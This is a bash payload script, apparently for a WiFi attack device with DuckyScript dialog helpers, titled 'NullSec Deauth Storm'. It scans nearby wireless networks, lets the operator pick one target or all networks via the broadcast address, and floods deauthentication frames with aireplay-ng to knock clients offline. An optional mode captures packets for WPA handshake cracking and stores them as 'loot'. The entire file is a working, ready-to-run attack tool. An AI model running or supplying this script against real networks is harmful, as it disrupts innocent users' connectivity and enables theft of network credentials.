#!/bin/bash
# Title: NullSec Deauth Storm
# Author: bad-antics
# Description: Targeted deauthentication attack with network selection
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{captures,logs}

# --- INTRODUCTION ---
PROMPT "NULLSEC DEAUTH STORM

WiFi deauthentication attack
to disconnect clients.

Features:
- Network scanning
- Target selection
- Capture mode option

Press OK to scan."

# --- DETECT MONITOR INTERFACE ---
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done

if [ -z "$MONITOR_IF" ]; then
    ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"
    exit 1
fi

LOG "Interface: $MONITOR_IF"

# --- SCAN ---
SPINNER_START "Scanning networks..."
rm -f /tmp/deauth_scan*
timeout 15 airodump-ng "$MONITOR_IF" -w /tmp/deauth_scan --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Parse results
declare -a BSSIDS CHANNELS ESSIDS
idx=0

while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    
    essid=$(echo "$essid" | tr -d ' ' | head -c 18)
    [ -z "$essid" ] && essid="[Hidden]"
    
    BSSIDS[$idx]="$bssid"
    CHANNELS[$idx]=$(echo "$channel" | tr -d ' ')
    ESSIDS[$idx]="$essid"
    idx=$((idx + 1))
    [ $idx -ge 10 ] && break
done < /tmp/deauth_scan-01.csv

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "No networks found!"
    exit 1
fi

# Show network list
PROMPT "Found $idx networks:

$(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${ESSIDS[$i]}"; done)

Enter number on next screen."

# Select target
TARGET=$(NUMBER_PICKER "Target (1-$idx), 0=ALL:" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac

if [ "$TARGET" -eq 0 ]; then
    TARGET_BSSID="FF:FF:FF:FF:FF:FF"
    TARGET_ESSID="ALL NETWORKS"
    TARGET_CHANNEL="1"
else
    TARGET=$((TARGET - 1))
    [ $TARGET -lt 0 ] && TARGET=0
    [ $TARGET -ge $idx ] && TARGET=$((idx - 1))
    TARGET_BSSID="${BSSIDS[$TARGET]}"
    TARGET_CHANNEL="${CHANNELS[$TARGET]}"
    TARGET_ESSID="${ESSIDS[$TARGET]}"
fi

# Duration
DURATION=$(NUMBER_PICKER "Duration (seconds):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
[ $DURATION -lt 5 ] && DURATION=5
[ $DURATION -gt 120 ] && DURATION=120

# Capture mode?
CAPTURE_MODE=""
resp=$(CONFIRMATION_DIALOG "Enable capture mode?

Saves packets for handshake
analysis after attack.")
[ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && CAPTURE_MODE="1"

# Confirm
resp=$(CONFIRMATION_DIALOG "ATTACK: $TARGET_ESSID

Duration: ${DURATION}s
Capture: $([ -n "$CAPTURE_MODE" ] && echo YES || echo NO)

START ATTACK?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# --- ATTACK ---
LOG "Attacking $TARGET_ESSID"
iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null

if [ -n "$CAPTURE_MODE" ]; then
    CAPFILE="$LOOT_DIR/captures/${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"
    airodump-ng "$MONITOR_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
        -w "$CAPFILE" --output-format pcap 2>/dev/null &
    CAP_PID=$!
fi

# Deauth loop
PKTS=0
END=$(($(date +%s) + DURATION))
while [ $(date +%s) -lt $END ]; do
    aireplay-ng -0 10 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
    PKTS=$((PKTS + 10))
    sleep 2
done

killall aireplay-ng airodump-ng 2>/dev/null

# Results
PROMPT "DEAUTH COMPLETE

Target: $TARGET_ESSID
Packets: $PKTS
$([ -n "$CAPTURE_MODE" ] && echo "Capture: $CAPFILE")

Press OK to exit."
